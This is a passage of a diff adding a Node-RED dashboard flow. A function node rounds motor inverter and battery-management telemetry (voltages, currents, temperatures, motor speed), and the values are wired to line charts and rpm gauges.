+        "paramsOpt": "queryParams",
+        "paramsOptType": "none",
+        "rows": "rows",
+        "rowsType": "msg",
+        "parseMustache": true,
+        "params": [],
+        "x": 340,
+        "y": 260,
+        "wires": [
+            [
+                "462c713e2f67e9a5"
+            ]
+        ]
+    },
+    {
+        "id": "ee0b250d87f6e5dc",
+        "type": "ui_chart",
+        "z": "4a2f2f6c3794d699",
+        "name": "",
+        "group": "4dce402db33a1ac6",
+        "order": 11,
+        "width": "6",
+        "height": 6,
+        "label": "Reference Voltages",
+        "chartType": "line",
+        "legend": "true",
+        "xformat": "HH:mm:ss",
+        "interpolate": "linear",
+        "nodata": "",
+        "dot": false,
+        "ymin": "0",
+        "ymax": "15",
+        "removeOlder": "5",
+        "removeOlderPoints": "",
+        "removeOlderUnit": "60",
+        "cutout": 0,
+        "useOneColor": false,
+        "useUTC": false,
+        "colors": [
+            "#1f77b4",
+            "#aec7e8",
+            "#ff7f0e",
+            "#2ca02c",
+            "#98df8a",
+            "#d62728",
+            "#ff9896",
+            "#9467bd",
+            "#c5b0d5"
+        ],
+        "outputs": 1,
+        "useDifferentColor": false,
+        "className": "",
+        "x": 830,
+        "y": 20,
+        "wires": [
+            []
+        ]
+    },
+    {
+        "id": "462c713e2f67e9a5",
+        "type": "function",
+        "z": "4a2f2f6c3794d699",
+        "name": "MC Code",
+        "func": "var sigFigs = 2\n\nvar inv_ref_voltage_12_0 =\n{\n    topic: \"inv_ref_voltage_12_0\",\n    payload: msg.payload[0].inv_ref_voltage_12_0\n}\ntry {\n    inv_ref_voltage_12_0.payload = inv_ref_voltage_12_0.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar inv_ref_voltage_5_0 =\n{\n    topic: \"inv_ref_voltage_5_0\",\n    payload: msg.payload[0].inv_ref_voltage_5_0\n}\ntry {\n    inv_ref_voltage_5_0.payload = inv_ref_voltage_5_0.payload.toFixed(sigFigs)\n} catch { }\n\nvar inv_ref_voltage_2_5 =\n{\n    topic: \"inv_ref_voltage_2_5\",\n    payload: msg.payload[0].inv_ref_voltage_2_5\n}\ntry {\n    inv_ref_voltage_2_5.payload = inv_ref_voltage_2_5.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar inv_ref_voltage_1_5 =\n{\n    topic: \"inv_ref_voltage_1_5\",\n    payload: msg.payload[0].inv_ref_voltage_1_5\n}\ntry {\n    inv_ref_voltage_1_5.payload = inv_ref_voltage_1_5.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar inv_iq =\n{\n    topic: \"inv_iq\",\n    payload: msg.payload[0].inv_iq\n}\ntry {\n    inv_iq.payload = inv_iq.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar inv_id =\n{\n    topic: \"inv_id\",\n    payload: msg.payload[0].inv_id\n}\ntry {\n    inv_id.payload = inv_id.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar inv_vq_ff =\n{\n    topic: \"inv_vq_ff\",\n    payload: msg.payload[0].inv_vq_ff\n}\ntry {\n    inv_vq_ff.payload = inv_vq_ff.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar inv_vd_ff =\n{\n    topic: \"inv_vd_ff\",\n    payload: msg.payload[0].inv_vd_ff\n}\ntry {\n    inv_vd_ff.payload = inv_vd_ff.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar inv_vbc_vq_voltage =\n{\n    topic: \"inv_vbc_vq_voltage\",\n    payload: msg.payload[0].inv_vbc_vq_voltage\n}\ntry {\n    inv_vbc_vq_voltage.payload = inv_vbc_vq_voltage.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar inv_vab_vd_voltage =\n{\n    topic: \"inv_vab_vd_voltage\",\n    payload: msg.payload[0].inv_vab_vd_voltage\n}\ntry {\n    inv_vab_vd_voltage.payload = inv_vab_vd_voltage.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar inv_output_voltage =\n{\n    topic: \"inv_output_voltage\",\n    payload: msg.payload[0].inv_output_voltage\n}\ntry {\n    inv_output_voltage.payload = inv_output_voltage.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar inv_dc_bus_voltage =\n{\n    topic: \"inv_dc_bus_voltage\",\n    payload: msg.payload[0].inv_dc_bus_voltage\n}\ntry {\n    inv_dc_bus_voltage.payload = inv_dc_bus_voltage.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar inv_dc_bus_current =\n{\n    topic: \"inv_dc_bus_current\",\n    payload: msg.payload[0].inv_dc_bus_current\n}\ntry {\n    inv_dc_bus_current.payload = inv_dc_bus_current.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar inv_phase_c_current =\n{\n    topic: \"inv_phase_c_current\",\n    payload: msg.payload[0].inv_phase_c_current\n}\ntry {\n    inv_phase_c_current.payload = inv_phase_c_current.payload.toFixed(sigFigs)\n} catch { }\n\nvar inv_phase_b_current =\n{\n    topic: \"inv_phase_b_current\",\n    payload: msg.payload[0].inv_phase_b_current\n}\ntry {\n    inv_phase_b_current.payload = inv_phase_b_current.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar inv_phase_a_current =\n{\n    topic: \"inv_phase_a_current\",\n    payload: msg.payload[0].inv_phase_a_current\n}\ntry {\n    inv_phase_a_current.payload = inv_phase_a_current.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar inv_motor_speed =\n{\n    topic: \"inv_motor_speed\",\n    payload: msg.payload[0].inv_motor_speed\n}\ntry {\n    inv_motor_speed.payload = inv_motor_speed.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar inv_motor_angle_electrical =\n{\n    topic: \"inv_motor_angle_electrical\",\n    payload: msg.payload[0].inv_motor_angle_electrical\n}\ntry {\n    inv_motor_angle_electrical.payload = inv_motor_angle_electrical.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar inv_motor_temperature =\n{\n    topic: \"inv_motor_temperature\",\n    payload: msg.payload[0].inv_motor_temperature\n}\ntry {\n    inv_motor_temperature.payload = inv_motor_temperature.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar inv_hot_spot_temperature =\n{\n    topic: \"inv_hot_spot_temperature\",\n    payload: msg.payload[0].inv_hot_spot_temperature\n}\ntry {\n    inv_hot_spot_temperature.payload = inv_hot_spot_temperature.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar inv_coolant_temperature =\n{\n    topic: \"inv_coolant_temperature\",\n    payload: msg.payload[0].inv_coolant_temperature\n}\ntry {\n    inv_coolant_temperature.payload = inv_coolant_temperature.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar inv_rtd2_temperature =\n{\n    topic: \"inv_rtd2_temperature\",\n    payload: msg.payload[0].inv_rtd2_temperature\n}\ntry {\n    inv_rtd2_temperature.payload = inv_rtd2_temperature.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar inv_rtd1_temperature =\n{\n    topic: \"inv_rtd1_temperature\",\n    payload: msg.payload[0].inv_rtd1_temperature\n}\ntry {\n    inv_rtd1_temperature.payload = inv_rtd1_temperature.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar inv_control_board_temperature =\n{\n    topic: \"inv_control_board_temperature\",\n    payload: msg.payload[0].inv_control_board_temperature\n}\ntry {\n    inv_control_board_temperature.payload = inv_control_board_temperature.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar inv_stall_burst_model_temperature =\n{\n    topic: \"inv_stall_burst_model_temperature\",\n    payload: msg.payload[0].inv_stall_burst_model_temperature\n}\ntry {\n    inv_stall_burst_model_temperature.payload = inv_stall_burst_model_temperature.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar inv_gate_driver_board_temperature =\n{\n    topic: \"inv_gate_driver_board_temperature\",\n    payload: msg.payload[0].inv_gate_driver_board_temperature\n}\ntry {\n    inv_gate_driver_board_temperature.payload = inv_gate_driver_board_temperature.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar inv_module_c_temperature =\n{\n    topic: \"inv_module_c_temperature\",\n    payload: msg.payload[0].inv_module_c_temperature\n}\ntry {\n    inv_module_c_temperature.payload = inv_module_c_temperature.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar inv_module_b_temperature =\n{\n    topic: \"inv_module_b_temperature\",\n    payload: msg.payload[0].inv_module_b_temperature\n}\ntry {\n    inv_module_b_temperature.payload = inv_module_b_temperature.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar inv_module_a_temperature =\n{\n    topic: \"inv_module_a_temperature\",\n    payload: msg.payload[0].inv_module_a_temperature\n}\ntry {\n    inv_module_a_temperature.payload = inv_module_a_temperature.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar inv_diag_ia =\n{\n    topic: \"inv_diag_ia\",\n    payload: msg.payload[0].inv_diag_ia\n}\ntry {\n    inv_diag_ia.payload = inv_diag_ia.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar inv_diag_ib =\n{\n    topic: \"inv_diag_ib\",\n    payload: msg.payload[0].inv_diag_ib\n}\ntry {\n    inv_diag_ib.payload = inv_diag_ib.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar inv_diag_ic =\n{\n    topic: \"inv_diag_ic\",\n    payload: msg.payload[0].inv_diag_ic\n}\ntry {\n    inv_diag_ic.payload = inv_diag_ic.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar inv_diag_vdc =\n{\n    topic: \"inv_diag_vdc\",\n    payload: msg.payload[0].inv_diag_vdc\n}\ntry {\n    inv_diag_vdc.payload = inv_diag_vdc.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar inv_diag_iq_cmd =\n{\n    topic: \"inv_diag_iq_cmd\",\n    payload: msg.payload[0].inv_diag_iq_cmd\n}\ntry {\n    inv_diag_iq_cmd.payload = inv_diag_iq_cmd.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar inv_diag_id_cmd =\n{\n    topic: \"inv_diag_id_cmd\",\n    payload: msg.payload[0].inv_diag_id_cmd\n}\ntry {\n    inv_diag_id_cmd.payload = inv_diag_id_cmd.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar inv_diag_fw_output =\n{\n    topic: \"inv_diag_fw_output\",\n    payload: msg.payload[0].inv_diag_fw_output\n}\ntry {\n    inv_diag_fw_output.payload = inv_diag_fw_output.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar inv_diag_vq_cmd =\n{\n    topic: \"inv_diag_vq_cmd\",\n    payload: msg.payload[0].inv_diag_vq_cmd\n}\ntry {\n    inv_diag_vq_cmd.payload = inv_diag_vq_cmd.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar inv_diag_vd_cmd =\n{\n    topic: \"inv_diag_vd_cmd\",\n    payload: msg.payload[0].inv_diag_vd_cmd\n}\ntry {\n    inv_diag_vd_cmd.payload = inv_diag_vd_cmd.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar inv_diag_vqs_cmd =\n{\n    topic: \"inv_diag_vqs_cmd\",\n    payload: msg.payload[0].inv_diag_vqs_cmd\n}\ntry {\n    inv_diag_vqs_cmd.payload = inv_diag_vqs_cmd.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar inv_diag_pwm_freq =\n{\n    topic: \"inv_diag_pwm_freq\",\n    payload: msg.payload[0].inv_diag_pwm_freq\n}\ntry {\n    inv_diag_pwm_freq.payload = inv_diag_pwm_freq.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar bms_max_discharge_current =\n{\n    topic: \"bms_max_discharge_current\",\n    payload: msg.payload[0].bms_max_discharge_current\n}\ntry {\n    bms_max_discharge_current.payload = bms_max_discharge_current.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar bms_max_charge_current =\n{\n    topic: \"bms_max_charge_current\",\n    payload: msg.payload[0].bms_max_charge_current\n}\ntry {\n    bms_max_charge_current.payload = bms_max_charge_current.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar inv_fast_torque_command =\n{\n    topic: \"inv_fast_torque_command\",\n    payload: msg.payload[0].inv_fast_torque_command\n}\ntry {\n    inv_fast_torque_command.payload = inv_fast_torque_command.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar inv_fast_torque_feedback =\n{\n    topic: \"inv_fast_torque_feedback\",\n    payload: msg.payload[0].inv_fast_torque_feedback\n}\ntry {\n    inv_fast_torque_feedback.payload = inv_fast_torque_feedback.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar inv_fast_motor_speed =\n{\n    topic: \"inv_fast_motor_speed\",\n    payload: msg.payload[0].inv_fast_motor_speed\n}\ntry {\n    inv_fast_motor_speed.payload = inv_fast_motor_speed.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar inv_fast_dc_bus_voltage =\n{\n    topic: \"inv_fast_dc_bus_voltage\",\n    payload: msg.payload[0].inv_fast_dc_bus_voltage\n}\ntry {\n    inv_fast_dc_bus_voltage.payload = inv_fast_dc_bus_voltage.payload.toFixed(sigFigs)\n} catch { }\n\nreturn [\n    inv_ref_voltage_12_0,\n    inv_ref_voltage_5_0,\n    inv_ref_voltage_2_5,\n    inv_ref_voltage_1_5,\n    inv_iq,\n    inv_id,\n    inv_vq_ff,\n    inv_vd_ff,\n    inv_vbc_vq_voltage,\n    inv_vab_vd_voltage,\n    inv_output_voltage,\n    inv_dc_bus_voltage,\n    inv_dc_bus_current,\n    inv_phase_c_current,\n    inv_phase_b_current,\n    inv_phase_a_current,\n    inv_motor_speed,\n    inv_motor_angle_electrical,\n    inv_motor_temperature,\n    inv_hot_spot_temperature,\n    inv_coolant_temperature,\n    inv_rtd2_temperature,\n    inv_rtd1_temperature,\n    inv_control_board_temperature,\n    inv_stall_burst_model_temperature,\n    inv_gate_driver_board_temperature,\n    inv_module_c_temperature,\n    inv_module_b_temperature,\n    inv_module_a_temperature,\n    inv_diag_ia,\n    inv_diag_ib,\n    inv_diag_ic,\n    inv_diag_vdc,\n    inv_diag_iq_cmd,\n    inv_diag_id_cmd,\n    inv_diag_fw_output,\n    inv_diag_vq_cmd,\n    inv_diag_vd_cmd,\n    inv_diag_vqs_cmd,\n    inv_diag_pwm_freq,\n    bms_max_discharge_current,\n    bms_max_charge_current,\n    inv_fast_torque_command,\n    inv_fast_torque_feedback,\n    inv_fast_motor_speed,\n    inv_fast_dc_bus_voltage\n];",
+        "outputs": 46,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 560,
+        "y": 400,
+        "wires": [
+            [
+                "ee0b250d87f6e5dc"
+            ],
+            [
+                "ee0b250d87f6e5dc"
+            ],
+            [
+                "ee0b250d87f6e5dc"
+            ],
+            [
+                "ee0b250d87f6e5dc"
+            ],
+            [
+                "d6e7561d85bd11b6"
+            ],
+            [
+                "d6e7561d85bd11b6"
+            ],
+            [
+                "e5830f05dd4db39d"
+            ],
+            [
+                "e5830f05dd4db39d"
+            ],
+            [
+                "f49d99c6b0b02d77"
+            ],
+            [
+                "f49d99c6b0b02d77"
+            ],
+            [
+                "df772818309d0499"
+            ],
+            [
+                "df772818309d0499"
+            ],
+            [
+                "fe6b4a402ce856a1"
+            ],
+            [
+                "b9c7ba040efde351"
+            ],
+            [
+                "b9c7ba040efde351"
+            ],
+            [
+                "b9c7ba040efde351"
+            ],
+            [
+                "b9f24e1a1e8c3f28",
+                "47c6f748f4e85402"
+            ],
+            [
+                "87a044d28b25c583"
+            ],
+            [
+                "054dd101e60dd310"
+            ],
+            [
+                "054dd101e60dd310"
+            ],
+            [
+                "054dd101e60dd310"
+            ],
+            [
+                "e5570d33b861a9a3"
+            ],
+            [
+                "e5570d33b861a9a3"
+            ],
+            [
+                "eca90818fcfec8ba"
+            ],
+            [
+                "df772818309d0499"
+            ],
+            [
+                "eca90818fcfec8ba"
+            ],
+            [
+                "1bcbe1efc015af9e"
+            ],
+            [
+                "1bcbe1efc015af9e"
+            ],
+            [
+                "1bcbe1efc015af9e"
+            ],
+            [
+                "4f0eaf4ca2f9da7f"
+            ],
+            [
+                "4f0eaf4ca2f9da7f"
+            ],
+            [
+                "4f0eaf4ca2f9da7f"
+            ],
+            [
+                "df772818309d0499"
+            ],
+            [
+                "46e38c17f5ce0eaf"
+            ],
+            [
+                "46e38c17f5ce0eaf"
+            ],
+            [
+                "fe6b4a402ce856a1"
+            ],
+            [
+                "d273f8164fbd84a6"
+            ],
+            [
+                "d273f8164fbd84a6"
+            ],
+            [
+                "df772818309d0499"
+            ],
+            [
+                "d4d3ed9a1a436581"
+            ],
+            [
+                "4ecafa0dd4a8b3d4"
+            ],
+            [
+                "4ecafa0dd4a8b3d4"
+            ],
+            [
+                "d32eece9a27aee39"
+            ],
+            [
+                "d32eece9a27aee39"
+            ],
+            [
+                "4504e0e644db03dd"
+            ],
+            [
+                "df772818309d0499"
+            ]
+        ]
+    },
+    {
+        "id": "d6e7561d85bd11b6",
+        "type": "ui_chart",
+        "z": "4a2f2f6c3794d699",
+        "name": "",
+        "group": "4dce402db33a1ac6",
+        "order": 15,
+        "width": "6",
+        "height": 6,
+        "label": "Iq and Id Current",
+        "chartType": "line",
+        "legend": "true",
+        "xformat": "HH:mm:ss",
+        "interpolate": "linear",
+        "nodata": "",
+        "dot": false,
+        "ymin": "0",
+        "ymax": "12",
+        "removeOlder": "5",
+        "removeOlderPoints": "",
+        "removeOlderUnit": "60",
+        "cutout": 0,
+        "useOneColor": false,
+        "useUTC": false,
+        "colors": [
+            "#1f77b4",
+            "#aec7e8",
+            "#ff7f0e",
+            "#2ca02c",
+            "#98df8a",
+            "#d62728",
+            "#ff9896",
+            "#9467bd",
+            "#c5b0d5"
+        ],
+        "outputs": 1,
+        "useDifferentColor": false,
+        "className": "",
+        "x": 830,
+        "y": 60,
+        "wires": [
+            []
+        ]
+    },
+    {
+        "id": "e5830f05dd4db39d",
+        "type": "ui_chart",
+        "z": "4a2f2f6c3794d699",
+        "name": "",
+        "group": "4dce402db33a1ac6",
+        "order": 12,
+        "width": "6",
+        "height": 6,
+        "label": "Feedforward Voltages",
+        "chartType": "line",
+        "legend": "true",
+        "xformat": "HH:mm:ss",
+        "interpolate": "linear",
+        "nodata": "",
+        "dot": false,
+        "ymin": "0",
+        "ymax": "15",
+        "removeOlder": "5",
+        "removeOlderPoints": "",
+        "removeOlderUnit": "60",
+        "cutout": 0,
+        "useOneColor": false,
+        "useUTC": false,
+        "colors": [
+            "#1f77b4",
+            "#aec7e8",
+            "#ff7f0e",
+            "#2ca02c",
+            "#98df8a",
+            "#d62728",
+            "#ff9896",
+            "#9467bd",
+            "#c5b0d5"
+        ],
+        "outputs": 1,
+        "useDifferentColor": false,
+        "className": "",
+        "x": 840,
+        "y": 100,
+        "wires": [
+            []
+        ]
+    },
+    {
+        "id": "f49d99c6b0b02d77",
+        "type": "ui_chart",
+        "z": "4a2f2f6c3794d699",
+        "name": "",
+        "group": "4dce402db33a1ac6",
+        "order": 13,
+        "width": "6",
+        "height": 6,
+        "label": "Voltage Between Phases",
+        "chartType": "line",
+        "legend": "true",
+        "xformat": "HH:mm:ss",
+        "interpolate": "linear",
+        "nodata": "",
+        "dot": false,
+        "ymin": "0",
+        "ymax": "15",
+        "removeOlder": "5",
+        "removeOlderPoints": "",
+        "removeOlderUnit": "60",
+        "cutout": 0,
+        "useOneColor": false,
+        "useUTC": false,
+        "colors": [
+            "#1f77b4",
+            "#aec7e8",
+            "#ff7f0e",
+            "#2ca02c",
+            "#98df8a",
+            "#d62728",
+            "#ff9896",
+            "#9467bd",
+            "#c5b0d5"
+        ],
+        "outputs": 1,
+        "useDifferentColor": false,
+        "className": "",
+        "x": 850,
+        "y": 140,
+        "wires": [
+            []
+        ]
+    },
+    {
+        "id": "b9c7ba040efde351",
+        "type": "ui_chart",
+        "z": "4a2f2f6c3794d699",
+        "name": "",
+        "group": "4dce402db33a1ac6",
+        "order": 20,
+        "width": "6",
+        "height": 6,
+        "label": "Phase Current",
+        "chartType": "line",
+        "legend": "true",
+        "xformat": "HH:mm:ss",
+        "interpolate": "linear",
+        "nodata": "",
+        "dot": false,
+        "ymin": "0",
+        "ymax": "12",
+        "removeOlder": "5",
+        "removeOlderPoints": "",
+        "removeOlderUnit": "60",
+        "cutout": 0,
+        "useOneColor": false,
+        "useUTC": false,
+        "colors": [
+            "#1f77b4",
+            "#aec7e8",
+            "#ff7f0e",
+            "#2ca02c",
+            "#98df8a",
+            "#d62728",
+            "#ff9896",
+            "#9467bd",
+            "#c5b0d5"
+        ],
+        "outputs": 1,
+        "useDifferentColor": false,
+        "className": "",
+        "x": 820,
+        "y": 300,
+        "wires": [
+            []
+        ]
+    },
+    {
+        "id": "b9f24e1a1e8c3f28",
+        "type": "ui_gauge",
+        "z": "4a2f2f6c3794d699",
+        "name": "",
+        "group": "4dce402db33a1ac6",
+        "order": 1,
+        "width": "6",
+        "height": "6",
+        "gtype": "gage",
+        "title": "Motor Speed",
+        "label": "rpm",
+        "format": "{{value}}",
+        "min": 0,
+        "max": "32767",
+        "colors": [
+            "#00b500",
+            "#e6e600",
+            "#ca3838"
+        ],
+        "seg1": "",
+        "seg2": "",
+        "diff": false,
+        "className": "",
+        "x": 810,
+        "y": 340,
+        "wires": []
+    },
+    {
+        "id": "054dd101e60dd310",
+        "type": "ui_chart",
+        "z": "4a2f2f6c3794d699",
+        "name": "",
+        "group": "4dce402db33a1ac6",
+        "order": 5,
+        "width": "6",
+        "height": "6",
+        "label": "Temperatures",
+        "chartType": "line",
+        "legend": "true",
+        "xformat": "HH:mm:ss",
+        "interpolate": "linear",
+        "nodata": "",
+        "dot": false,
+        "ymin": "0",
+        "ymax": "100",
+        "removeOlder": "5",
+        "removeOlderPoints": "",
+        "removeOlderUnit": "60",
+        "cutout": 0,
+        "useOneColor": false,
+        "useUTC": false,
+        "colors": [
+            "#1f77b4",
+            "#aec7e8",
+            "#ff7f0e",
+            "#2ca02c",
+            "#98df8a",
+            "#d62728",
+            "#ff9896",
+            "#9467bd",
+            "#c5b0d5"
+        ],
+        "outputs": 1,
+        "useDifferentColor": false,
+        "className": "",
+        "x": 820,
+        "y": 480,
+        "wires": [
+            []
+        ]
+    },
+    {
+        "id": "e5570d33b861a9a3",
+        "type": "ui_chart",
+        "z": "4a2f2f6c3794d699",
+        "name": "",
+        "group": "4dce402db33a1ac6",
+        "order": 7,
+        "width": "6",
+        "height": "6",
+        "label": "RTD Input Temperatures",
+        "chartType": "line",
+        "legend": "true",
+        "xformat": "HH:mm:ss",
+        "interpolate": "linear",
+        "nodata": "",
+        "dot": false,
+        "ymin": "0",
+        "ymax": "100",
+        "removeOlder": "5",
+        "removeOlderPoints": "",
+        "removeOlderUnit": "60",
+        "cutout": 0,
+        "useOneColor": false,
+        "useUTC": false,
+        "colors": [
+            "#1f77b4",
+            "#aec7e8",
+            "#ff7f0e",
+            "#2ca02c",
+            "#98df8a",
+            "#d62728",
+            "#ff9896",
+            "#9467bd",
+            "#c5b0d5"
+        ],
+        "outputs": 1,
+        "useDifferentColor": false,
+        "className": "",
+        "x": 850,
+        "y": 520,
+        "wires": [
+            []
+        ]
+    },
+    {
+        "id": "1bcbe1efc015af9e",
+        "type": "ui_chart",
+        "z": "4a2f2f6c3794d699",
+        "name": "",
+        "group": "4dce402db33a1ac6",
+        "order": 6,
+        "width": "6",
+        "height": "6",
+        "label": "Module Temperature",
+        "chartType": "line",
+        "legend": "true",
+        "xformat": "HH:mm:ss",
+        "interpolate": "linear",
+        "nodata": "",
+        "dot": false,
+        "ymin": "0",
+        "ymax": "100",
+        "removeOlder": "5",
+        "removeOlderPoints": "",
+        "removeOlderUnit": "60",
+        "cutout": 0,
+        "useOneColor": false,
+        "useUTC": false,
+        "colors": [
+            "#1f77b4",
+            "#aec7e8",
+            "#ff7f0e",
+            "#2ca02c",
+            "#98df8a",
+            "#d62728",
+            "#ff9896",
+            "#9467bd",
+            "#c5b0d5"
+        ],
+        "outputs": 1,
+        "useDifferentColor": false,
+        "className": "",
+        "x": 840,
+        "y": 600,
+        "wires": [
+            []
+        ]
+    },
+    {
+        "id": "4f0eaf4ca2f9da7f",
+        "type": "ui_chart",
+        "z": "4a2f2f6c3794d699",
+        "name": "",
+        "group": "4dce402db33a1ac6",
+        "order": 16,
+        "width": "6",
+        "height": "6",
+        "label": "Diagnostic Phase Currents",
+        "chartType": "line",
+        "legend": "true",
+        "xformat": "HH:mm:ss",
+        "interpolate": "linear",
+        "nodata": "",
+        "dot": false,
+        "ymin": "1",
+        "ymax": "12",
+        "removeOlder": "5",
+        "removeOlderPoints": "",
+        "removeOlderUnit": "60",
+        "cutout": 0,
+        "useOneColor": false,
+        "useUTC": false,
+        "colors": [
+            "#1f77b4",
+            "#aec7e8",
+            "#ff7f0e",
+            "#2ca02c",
+            "#98df8a",
+            "#d62728",
+            "#ff9896",
+            "#9467bd",
+            "#c5b0d5"
+        ],
+        "outputs": 1,
+        "useDifferentColor": false,
+        "className": "",
+        "x": 860,
+        "y": 680,
+        "wires": [
+            []
+        ]
+    },
+    {
+        "id": "46e38c17f5ce0eaf",
+        "type": "ui_chart",
+        "z": "4a2f2f6c3794d699",
+        "name": "",
+        "group": "4dce402db33a1ac6",
+        "order": 18,
+        "width": "6",
+        "height": "6",
+        "label": "Command Currents",
+        "chartType": "line",
+        "legend": "true",
+        "xformat": "HH:mm:ss",
+        "interpolate": "linear",
+        "nodata": "",
+        "dot": false,
+        "ymin": "0",
+        "ymax": "15",
+        "removeOlder": "5",
+        "removeOlderPoints": "",
+        "removeOlderUnit": "60",
+        "cutout": 0,
+        "useOneColor": false,
+        "useUTC": false,
+        "colors": [
+            "#1f77b4",
+            "#aec7e8",
+            "#ff7f0e",
+            "#2ca02c",
+            "#98df8a",
+            "#d62728",
+            "#ff9896",
+            "#9467bd",
+            "#c5b0d5"
+        ],
+        "outputs": 1,
+        "useDifferentColor": false,
+        "className": "",
+        "x": 830,
+        "y": 720,
+        "wires": [
+            []
+        ]
+    },
+    {
+        "id": "d273f8164fbd84a6",
+        "type": "ui_chart",
+        "z": "4a2f2f6c3794d699",
+        "name": "",
+        "group": "4dce402db33a1ac6",
+        "order": 17,
+        "width": "6",
+        "height": "6",
+        "label": "Command Voltages",
+        "chartType": "line",
+        "legend": "true",
+        "xformat": "HH:mm:ss",
+        "interpolate": "linear",
+        "nodata": "",
+        "dot": false,
+        "ymin": "0",
+        "ymax": "12",
+        "removeOlder": "5",
+        "removeOlderPoints": "",
+        "removeOlderUnit": "60",
+        "cutout": 0,
+        "useOneColor": false,
+        "useUTC": false,
+        "colors": [
+            "#1f77b4",
+            "#aec7e8",
+            "#ff7f0e",
+            "#2ca02c",
+            "#98df8a",
+            "#d62728",
+            "#ff9896",
+            "#9467bd",
+            "#c5b0d5"
+        ],
+        "outputs": 1,
+        "useDifferentColor": false,
+        "className": "",
+        "x": 830,
+        "y": 800,
+        "wires": [
+            []
+        ]
+    },
+    {
+        "id": "4ecafa0dd4a8b3d4",
+        "type": "ui_chart",
+        "z": "4a2f2f6c3794d699",
+        "name": "",
+        "group": "4dce402db33a1ac6",
+        "order": 19,
+        "width": "6",
+        "height": "6",
+        "label": "Max BMS Current",
+        "chartType": "line",
+        "legend": "true",
+        "xformat": "HH:mm:ss",
+        "interpolate": "linear",
+        "nodata": "",
+        "dot": false,
+        "ymin": "0",
+        "ymax": "1000",
+        "removeOlder": "5",
+        "removeOlderPoints": "",
+        "removeOlderUnit": "60",
+        "cutout": 0,
+        "useOneColor": false,
+        "useUTC": false,
+        "colors": [
+            "#1f77b4",
+            "#aec7e8",
+            "#ff7f0e",
+            "#2ca02c",
+            "#98df8a",
+            "#d62728",
+            "#ff9896",
+            "#9467bd",
+            "#c5b0d5"
+        ],
+        "outputs": 1,
+        "useDifferentColor": false,
+        "className": "",
+        "x": 830,
+        "y": 920,
+        "wires": [
+            []
+        ]
+    },
+    {
+        "id": "4504e0e644db03dd",
+        "type": "ui_gauge",
+        "z": "4a2f2f6c3794d699",
+        "name": "",
+        "group": "4dce402db33a1ac6",
+        "order": 2,
+        "width": "6",
+        "height": "6",
+        "gtype": "gage",
+        "title": "Motor Speed Max",
+        "label": "rpm",
+        "format": "{{value}}",
+        "min": 0,
+        "max": "32767",
+        "colors": [
+            "#00b500",
+            "#e6e600",
+            "#ca3838"
+        ],
+        "seg1": "",
+        "seg2": "",
+        "diff": false,
+        "className": "",
+        "x": 830,
+        "y": 960,
+        "wires": []
+    },
+    {
+        "id": "eca90818fcfec8ba",
+        "type": "ui_chart",
+        "z": "4a2f2f6c3794d699",
+        "name": "",
+        "group": "4dce402db33a1ac6",
+        "order": 8,
+        "width": "6",
+        "height": "6",
+        "label": "Board Temeperatures",
+        "chartType": "line",
+        "legend": "true",
+        "xformat": "HH:mm:ss",
+        "interpolate": "linear",
+        "nodata": "",
+        "dot": false,
+        "ymin": "0",
+        "ymax": "100",
+        "removeOlder": "5",
+        "removeOlderPoints": "",
+        "removeOlderUnit": "60",
+        "cutout": 0,
+        "useOneColor": false,
+        "useUTC": false,
+        "colors": [
+            "#1f77b4",
+            "#aec7e8",
+            "#ff7f0e",
+            "#2ca02c",
+            "#98df8a",
+            "#d62728",
+            "#ff9896",
+            "#9467bd",
+            "#c5b0d5"
+        ],
+        "outputs": 1,
+        "useDifferentColor": false,
+        "className": "",
+        "x": 840,
+        "y": 560,
+        "wires": [
+            []
+        ]
+    },
+    {
+        "id": "87a044d28b25c583",
+        "type": "ui_chart",
+        "z": "4a2f2f6c3794d699",
+        "name": "",
+        "group": "4dce402db33a1ac6",
+        "order": 9,
+        "width": "6",
+        "height": "6",
+        "label": "Motor Angle (Electrical)",
+        "chartType": "line",
+        "legend": "false",
+        "xformat": "HH:mm:ss",
+        "interpolate": "linear",
+        "nodata": "",
+        "dot": false,
+        "ymin": "",
+        "ymax": "",
+        "removeOlder": "5",
+        "removeOlderPoints": "",
+        "removeOlderUnit": "60",
+        "cutout": 0,
